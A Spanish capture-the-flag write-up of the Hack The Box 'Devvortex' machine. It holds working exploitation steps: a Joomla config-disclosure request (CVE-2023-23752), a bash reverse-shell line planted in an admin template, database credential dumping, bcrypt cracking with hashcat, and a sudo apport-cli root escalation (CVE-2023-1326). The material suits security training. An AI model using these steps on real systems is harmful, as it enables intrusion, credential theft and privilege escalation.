# Devvortex
<table>
  <tr>
    <td style="vertical-align: top; padding-right: 20px;">
      <img src="portadas/Devvortex.png" alt="Devvortex" style="max-width:320px; width:100%; height:auto;"/>
    </td>
    <td style="vertical-align: top; padding-left: 20px;">
      <strong>Vulnerabilidades / Características a tratar</strong>
      <ul>
        <li>Enumeración de Subdominios</li>
        <li>Abusando de Joomla</li>
        <li>Joomla Exploitation (CVE-2023-23752)</li>
        <li>Personalizando plantilla de administración para RCE</li>
        <li>Enumeración de base de datos (User Pivoting)</li>
        <li>Abusando de sudoers (apport-cli) [Privilege Escalation] (CVE-2023-1326)</li>
      </ul>
    </td>
  </tr>
</table>
## Reconocimiento inicial
Primero lanzamos un escaneo básico de recnocimiento sobre el objetivo:


```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG allports
```

```shell
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

```
Encontramos los dos puertos y comprobamos las versiones

```shell
nmap -sCV -p22,80 10.10.11.242 -oN targeted
```

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 09:56 EDT
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

No obtenemos nada muy relevnte por lo tanto vamos sa examinar la página

## Enumeración de la página web

Si primeramente usamos la herramienta Whatweb podemos ver que contiene la página web
```shell
whatweb http://devvortex.htb
```
```shell     
http://devvortex.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

### Enumeracion de directorios y subdomnios

Usamos gobuster y Wfuzz para obtener subdomnios y listado de directorios que no sean habituales

```shell
wfuzz -c --hc=404,302 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.devvortex.htb" http://devvortex.htb
```

obtemos como salida lo siguiente:
```shell
000000019:   200        501 L    1581 W     23221 Ch    "dev"
```

Por lo tanto lo añadimos al fichero de `hosts` y comprobamos que tiene.

### Panel login de Joomla

Nos encontramos con una pagina que usa el CMS Joomla si lo enumeramos podemos ver que es vulnerable (CVE-2023-23752) 

Usando ese CVE podemos  intentar extraer datos sensibles de la página:
```shell
curl -s -X GET http://dev.devvortex.htb/api/index.php/v1/config/application?public=true | jq
```
obtenemos un ususario y una contraseña de la base de datos de msqli ademas de un posible usuario y contraseña para el panel de login de Jommla

```shell 
{
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "lewis",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "P4ntherg0t1n5r3c0n##",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "db": "joomla",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbprefix": "sd4fg_",
        "id": 224
      }
    },
```

### Intrusión en el panel de administrador de Joomla

Parece que hemos podido acceder al panel de administrador por lo tanto hay algunos ficheros que son sensibles que podemos editar. 

En concreto podemos ver que en el apartado de `settings`encontramos un fichero `index.php`que podemos editar es donde voy a intentar establar una revershell utilizando `nc`

```shell
system("bash -c 'bash -i >& /dev/tcp/<IP>/443 0>&1'");
```

## Intrusión en el sistema
Una vez que estamos dentro del systema realizamos los comandos básicos de renocimiento como `id`

### Tratamiento de la STTY
Hacemos tratamiento de la STTY para que se nos quede una terminal más interactiva 

le damos a `CTRL Z`, despues en nuestra máquina realizamos un el siguiente comando:

```shell
stty raw -echo: fg
```

resetamos la terminal con `reset xterm` y exportamos las nuevas variables de entorno `export TERM=xterm` y `export SHELL=/bin/bash`

### Enumeramos el sistema

Podemos ver que existe otro ususario  llamado `logan`que desconocemos su contraseña y es el que puede ver la flag.

Por lo tanto vamos a tener que intentar un user pivoting , para ello podemos intentar acceder a la BD porque teniamos anteriormente sus credenciales.

```shell
user:lewis
passwd:P4ntherg0t1n5r3c0n##
```

por lo tanto vamos a intentar enumerar la BD.

### Enumeramos la BD

Intentamos acceder a la BD usando el siguiente comando:

```shell
mysql -u lewis -p P4ntherg0t1n5r3c0n##
```

Accedemos a la BD y enumeramos las BD y base de datos que tengamos. Finalmente encontramos una tabla `sd4fg_users`que si vemos que contiene es: 

```shell
+---------------+---------------+------+-----+---------+----------------+
| Field         | Type          | Null | Key | Default | Extra          |
+---------------+---------------+------+-----+---------+----------------+
| id            | int           | NO   | PRI | NULL    | auto_increment |
| name          | varchar(400)  | NO   | MUL |         |                |
| username      | varchar(150)  | NO   | UNI |         |                |
| email         | varchar(100)  | NO   | MUL |         |                |
| password      | varchar(100)  | NO   |     |         |                |
| block         | tinyint       | NO   | MUL | 0       |                |
| sendEmail     | tinyint       | YES  |     | 0       |                |
| registerDate  | datetime      | NO   |     | NULL    |                |
| lastvisitDate | datetime      | YES  |     | NULL    |                |
| activation    | varchar(100)  | NO   |     |         |                |
| params        | text          | NO   |     | NULL    |                |
| lastResetTime | datetime      | YES  |     | NULL    |                |
| resetCount    | int           | NO   |     | 0       |                |
| otpKey        | varchar(1000) | NO   |     |         |                |
| otep          | varchar(1000) | NO   |     |         |                |
| requireReset  | tinyint       | NO   |     | 0       |                |
| authProvider  | varchar(100)  | NO   |     |         |                |
+---------------+---------------+------+-----+---------+----------------+
```

Por lo tanto si hacemos una petición de SQL que nos muestre los usuarios y las contraseñas, obtenemos lo siguiente:

```shell
mysql> select username,password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
```
### Crackeo de la contraseña.

Como se puede apreciar las contraseñas se encunetran cifradas pordemos intentar averiguarlas usando la herramienta `hashcat`, para ello vamos a comprobar si podemos averiguar que tipo de cifrado tienen.

```shell
hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
Analyzing '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt
```

Vemos que han usado `Blowfish` para cifrar la contraseña por lo tanto vamos a comprobar su identificador. 

```shell
hashcat --example-hashes | grep -i "Blowfish" -B 5
```

```shell
Potfile.Enabled.....: Yes
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX

Hash mode #3200
  Name................: bcrypt $2*$, Blowfish (Unix)
--
  Potfile.Enabled.....: Yes
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX

Hash mode #18600
  Name................: Open Document Format (ODF) 1.1 (SHA-1, Blowfish
```

Obtenemos que su identificador es el `#3200` por lo tanto vamos a intentar descifrarla.

```shell
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
Finalmente obtenemos que la contraseña es:

```shell
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
```

## Escalada de privilegios

Una vez que tenemos las credenciales validas vamos a realizar los comandos típicos de reconocimiento para comprobar si existe algún fichero que podemos ejecutar como ususario `root`  

```
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

### Abusando de apport-cli (CVE-2023-1326)

Vemos que existe un exploit que podemos usar para explotar la vulnerabilidad de apport-cli 

para ello tenemos que ejecutar como usuario `root` el siguiente comando.

```shell
sudo /usr/bin/apport-cli -c /var/crash/some_crash_file.crash
```

Finalmente si lo ejecutamos y tenemos algún fichero `some_crash_file.crash` podemos llegar a la función 


```shell

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (0.0 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
```
De esta manera podemos colar una `!/bin/bash` que al ejecutarse como root nos devolvera una bash con privilegios.

```shell
root@devvortex:/tmp# whoami
root
root@devvortex:/tmp# cd /root
root@devvortex:~# ls
root.txt
root@devvortex:~# cat root.txt
```





